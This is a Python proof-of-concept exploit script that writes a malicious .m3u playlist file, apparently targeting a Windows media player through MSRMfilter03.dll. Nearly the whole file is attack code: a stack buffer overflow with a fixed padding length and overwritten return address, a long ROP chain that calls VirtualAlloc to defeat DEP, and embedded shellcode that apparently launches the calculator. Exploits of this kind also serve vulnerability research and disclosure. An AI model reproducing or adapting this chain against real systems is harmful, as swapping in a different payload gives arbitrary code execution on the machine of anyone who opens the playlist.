#!/usr/bin/python
 
import sys, struct
 
file="crash_alpha.m3u"
 
#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------------------------#

rop = struct.pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP
# EDX -> flAllocationType (0x1000):
rop += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN (we move a static value into EDX for calculations)
rop += struct.pack('<L',0x41414141) # padding for POP EBP (compensation for the POP)
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # EBX set up with 0x1A750FFF
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10 (when we add these values together the result is 0x00001000)
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate (to compensate for the POP and RETN 10)
# EBP:
rop += struct.pack('<L',0x10031c3f) # POP EBP # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031c3f) # skip 4 bytes [MSRMfilter03.dll]
# EBX -> dwSize (0x0001):
rop += struct.pack('<L',0x100136a2) # POP EBX # RETN [MSRMfilter03.dll] 
rop += struct.pack('<L',0xffffffff) # initialisation de EBX en dur
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN [MSRMfilter03.dll]
# ECX:
rop += struct.pack('<L',0x1001263d) # POP ECX # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0xffffffff) # initialisation de ECX en dur
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x10031d7e) # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
# EDI:
rop += struct.pack('<L',0x1002e21e) # POP EDI # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x1002a602) # RETN (ROP NOP) [MSRMfilter03.dll]
# ESI:
rop += struct.pack('<L',0x1002432c) # POP ESI # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x1002ab52) # JMP [EAX] [MSRMfilter03.dll]
rop += struct.pack('<L',0x1002b82d) # POP EAX # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x1005d060) # ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
# PUSHAD:
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN [MSRMfilter03.dll]
rop += struct.pack('<L',0x100371f5) # ptr to 'call esp' [MSRMfilter03.dll]

calc = (
"\x31\xD2\x52\x68\x73\x71\x7C\x73\x59\x81\xF1\x10\x10"
"\x10\x10\x51\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76"
"\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C"
"\x8B\x5C\x3B\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F"
"\x24\x0F\xB7\x2C\x17\x42\x42\xAD\x68\x47\x79\x7E\x55"
"\x59\x81\xF1\x10\x10\x10\x10\x39\x0C\x07\x75\xE8\x8B"
"\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\x10\x10\x10"
"\x10")

#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
shell = "\x90"*5 + calc
crash = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + shell + "C"*(7572-len(rop + shell))
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
print("Exploit created")
